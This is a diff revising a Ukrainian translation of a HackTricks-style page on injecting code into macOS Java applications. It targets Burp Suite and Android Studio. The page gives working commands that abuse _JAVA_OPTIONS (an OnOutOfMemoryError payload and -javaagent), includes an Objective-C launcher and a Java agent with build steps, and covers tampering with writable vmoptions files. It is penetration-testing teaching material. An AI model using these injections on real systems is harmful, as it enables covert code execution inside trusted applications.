@@ -1,10 +1,10 @@
-# macOS Java Applications Injection
+# Ін’єкція в Java Applications у macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Перерахування
 
-Знайдіть Java-застосунки, інстальовані у вашій системі. Було помічено, що Java-застосунки у **Info.plist** містять деякі Java-параметри, які містять рядок **`java.`**, тому його можна знайти:
+Знайдіть Java applications, встановлені у вашій системі. Було помічено, що Java apps у **Info.plist** містять деякі java parameters, які містять рядок **`java.`**, тому можна виконати пошук за ним:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Змінну середовища **`_JAVA_OPTIONS`** можна використовувати для ін’єкції довільних параметрів Java під час виконання скомпільованого Java-застосунку:
+Змінну середовища **`_JAVA_OPTIONS`** можна використовувати для ін’єкції довільних параметрів Java VM під час запуску Java-застосунку.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Щоб виконати його як новий процес, а не як дочірній процес поточного термінала, можна використати:
+Щоб виконати це як новий процес, а не як дочірній процес поточного термінала, можна використати:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Однак це спричинить помилку в запущеному застосунку; інший, більш прихований спосіб — створити java agent і використати:
+Однак ця техніка спричиняє помилку у виконуваній програмі. Більш прихованою альтернативою є створення Java agent і використання `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Створення агента з **іншою версією Java**, ніж у застосунку, може призвести до аварійного завершення роботи як агента, так і застосунку
+> Створення агента з **іншою версією Java**, ніж у застосунку, може призвести до аварійного завершення роботи як агента, так і застосунку.
 
-Агент може бути:
+Де агент може бути:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Щоб скомпілювати агент, виконайте:
+Щоб скомпілювати agent, виконайте:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Потім експортуйте змінну середовища та запустіть Java-застосунок так:
+Потім експортуйте змінну середовища та запустіть Java application так:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## файл vmoptions
+## Файл vmoptions
 
-Цей файл підтримує вказання **Java params** під час запуску Java. Ви можете використати деякі з попередніх трюків, щоб змінити параметри Java і **змусити процес виконувати довільні команди**.\
-Крім того, цей файл також може **підключати інші** за допомогою директорії `include`, тож ви також можете змінити підключений файл.
+Цей файл підтримує вказання **параметрів Java** під час запуску Java. Ви можете використати деякі з попередніх технік, щоб змінити параметри Java і **змусити процес виконувати довільні команди**.\
+Крім того, цей файл також може **підключати інші файли** за допомогою директиви `include`, тому ви також можете змінити підключений файл.
 
-Більше того, деякі Java-застосунки **завантажують більше одного файлу `vmoptions`**.
+Більше того, деякі Java-застосунки **завантажують більше одного** файла `vmoptions`.
 
-Деякі застосунки, наприклад Android Studio, виводять у своєму **output, де саме вони шукають** ці файли, наприклад:
+Деякі застосунки, як-от Android Studio, вказують у своєму **виводі, де вони шукають** ці файли:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Якщо вони цього не роблять, ви можете легко перевірити це за допомогою:
+Якщо вони цього не роблять, перевірити це можна за допомогою:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Зверніть увагу, як цікаво: у цьому прикладі Android Studio намагається завантажити файл **`/Applications/Android Studio.app.vmoptions`** — місце, до якого будь-який користувач із групи **`admin`** має доступ на запис.
+Зверніть увагу, що в цьому прикладі Android Studio намагається завантажити **`/Applications/Android Studio.app.vmoptions`** — розташування, до якого будь-який користувач із групи **`admin` має доступ на запис**.
 
+## References
+
+- [1] [OpenJDK — аналіз `_JAVA_OPTIONS` у `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — специфікація пакета `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — налаштування параметрів JVM і властивостей платформи](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
